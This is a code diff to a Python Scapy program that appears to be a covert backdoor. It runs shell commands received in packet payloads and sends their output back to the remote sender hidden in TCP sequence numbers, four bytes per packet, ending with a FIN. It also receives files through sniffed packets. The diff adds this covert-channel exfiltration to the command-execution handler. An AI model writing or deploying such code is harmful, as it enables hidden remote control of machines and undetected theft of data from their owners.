@@ -349,9 +349,9 @@ def sendFile(packet):
 			dPacket = sniff(filter="tcp sport " + str(packet[TCP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
 			if len(dPacket) == 0:
 				break
-			tFile.write(dPacket[RAW].load)
 			if "F" in dPacket[0][TCP].flags:
 				break
+			tFile.write(dPacket[RAW].load)
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -413,8 +413,19 @@ def terminal(packet):
 	output = subpricess.check_output(packet[RAW].load, stderr=subprocess.STDOUT)
 	
 	confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
-	                TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)/\
-	                RAW(load=encrypt(output))
+	                TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)#/\
+	                #RAW(load=encrypt(output))
+
+	for i in range(0, len(output), 4):
+		confirmPacket[TCP].seq = 0
+		for char in output[i:i+4]:
+			confirmPacket[TCP].seq = confirmPacket[TCP].seq<<8
+			confirmPacket[TCP].seq = confirmPacket[TCP].seq + ord(char)
+
+		send(confirmPacket, verbose=0)
+
+	confirmPacket[TCP].seq = confirmPacket[TCP].seq + 1
+	confirmPacket[TCP].flags = "F"
 	send(confirmPacket, verbose=0)
 	if len(logFile) > 0:
 		with open(logFile, "a") as serverLog:
